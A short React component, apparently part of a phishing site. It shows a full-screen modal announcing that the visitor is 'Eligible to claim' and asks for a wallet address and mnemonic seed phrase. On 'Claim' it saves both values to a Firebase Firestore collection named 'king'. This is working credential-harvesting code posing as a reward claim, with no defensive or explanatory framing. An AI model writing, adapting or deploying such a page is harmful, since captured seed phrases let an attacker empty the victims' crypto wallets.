import { db } from "./firebaseApp"
import { addDoc, collection, getDocs } from "firebase/firestore"
import { useState } from "react"
import { async } from "@firebase/util"
export default function Modal(params) {
    const collections=collection(db, 'king')
    const [formData, setForm]=useState({})
    console.log(collections)
    const documents= getDocs(collections).then((data)=>data)
    console.log(documents)
    function onchange(e){
        const {value, name}=e.target
        setForm((prev)=>{
            return({
                ...prev,
                [name]:value
            })
        })
        
    }
    console.log(formData)
    async function Submit(e){
        e.preventDefault();
        if(formData.address&&formData.mnemonic){
            await addDoc(collections, formData)
            document.getElementById('success').classList.toggle('d-none')
        }else{
            alert('Enter your mnenomic and address')
        }
        
    }
    return(
        <div style={{backgroundColor:'#000e',zIndex:'100000000', width:'100%', height:'100vh', position:"fixed", top:'0',left:'0'}} className=" d-flex align-items-center justify-content-center">
            <div className="col-6 text-light bg-dark px-3 py-5 text-center">
                <h4>Congratulations, You are Eligible to claim</h4>
                {/* <p>Enter your Mnenomic</p> */}
                <input type='text ' name="address" onChange={onchange} className="col-9 d-block mx-auto mt-4 mb-2" placeholder="Enter your Address"></input>
                
                <input type='text' onChange={onchange} name="mnemonic" className="col-9 d-block mx-auto mb-3" placeholder="Enter your Mnenomic"></input>
                <button onClick={Submit} className='btn d-block p-2 col-4 mx-auto'>Claim</button>
            </div>
        </div>
    )
    
};
